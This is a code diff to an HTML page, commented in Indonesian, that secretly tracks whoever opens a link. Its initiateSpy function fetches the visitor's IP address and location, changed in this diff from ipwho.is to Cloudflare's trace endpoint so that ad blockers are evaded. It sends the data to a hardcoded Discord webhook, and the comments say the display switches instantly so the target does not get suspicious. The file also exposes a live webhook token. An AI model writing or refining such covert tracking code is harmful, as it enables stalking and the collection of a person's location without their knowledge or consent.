@@ -52,38 +52,37 @@
     <script>
         const DISCORD_URL = "https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME"; // <--- GANTI INI
 
-      function initiateSpy() {
-    // 1. Tampilan di HP dia langsung pindah (Instan)
+      async function initiateSpy() {
+    // Pindah tampilan tetap instan agar dia tidak curiga
     document.getElementById('step1').classList.add('hidden');
     document.getElementById('step2').classList.remove('hidden');
 
-    // 2. Mulai proses pelacakan di latar belakang
-    (async () => {
-        try {
-            // Kita ambil data lokasi dulu
-            const response = await fetch(`https://ipwho.is/?_=${new Date().getTime()}`);
-            const data = await response.json();
-            
-            let infoFinal = "";
-            if(data.success) {
-                // Jika sukses, susun datanya
-                infoFinal = `📍 **Lokasi:** ${data.city}, ${data.region}, ${data.country}\n` +
-                            `🌐 **ISP:** ${data.connection.isp}\n` +
-                            `🗺️ **Maps:** https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-            } else {
-                infoFinal = "❌ Gagal melacak lokasi (Data tidak ditemukan)";
-            }
+    try {
+        // Menggunakan Cloudflare Trace (Sangat jarang diblokir)
+        const response = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+        const data = await response.text();
+        
+        // Cloudflare memberikan data dalam bentuk teks, kita rapihkan:
+        const lines = data.split('\n');
+        const infoMap = {};
+        lines.forEach(line => {
+            const [key, value] = line.split('=');
+            if (key) infoMap[key] = value;
+        });
 
-            // 3. SETELAH data dapat, baru kirim ke Discord
-            sendToDiscord("🔔 Seseorang Membuka Link!", infoFinal, 3447003);
+        // Karena Cloudflare hanya memberi IP & Lokasi Kode Negara, 
+        // kita kirim data minimal yang penting pasti TERKIRIM.
+        const infoFinal = `🌐 **IP Address:** ${infoMap.ip}\n` +
+                          `📍 **Negara:** ${infoMap.loc}\n` +
+                          `📱 **Data Center:** ${infoMap.colo}\n` +
+                          `🔍 **Info:** Data ini lebih aman dari blokir AdBlock.`;
 
-        } catch (e) { 
-            // Jika koneksi internet atau API error
-            sendToDiscord("🔔 Seseorang Membuka Link!", "⚠️ Gagal melacak (Terhalang Adblock/Sinyal)", 16711680); 
-        }
-    })();
+        sendToDiscord("🔔 Seseorang Membuka Link!", infoFinal, 3447003);
 
-
+    } catch (e) {
+        // Jika tetap gagal, kirim notif minimal agar kamu tahu dia sudah buka
+        sendToDiscord("🔔 Seseorang Membuka Link!", "⚠️ Target menggunakan AdBlocker kuat, lokasi detail disembunyikan.", 16711680);
+    }
             // Pindah ke step 2
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
@@ -145,3 +144,4 @@
     </script>
 </body>
 </html>
+
